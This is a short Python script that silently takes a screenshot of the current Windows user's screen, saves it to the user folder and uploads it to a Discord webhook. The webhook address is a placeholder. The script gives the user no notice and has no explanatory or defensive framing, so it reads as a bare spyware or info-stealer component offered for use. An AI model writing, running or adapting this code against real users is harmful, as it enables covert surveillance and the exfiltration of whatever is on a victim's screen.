import pyscreenshot as ImageGrab
from dhooks import Webhook, File
import os
import getpass
# take image -> save it to root path -> send image -> del image
user = getpass.getuser()
path_img = f'''C:/Users/{user}/screen.png'''

im = ImageGrab.grab()
im.save(path_img)
hook = "L!Nk123"
hook1 = Webhook(hook)
file = File(path_img)
hook1.send(file=file)

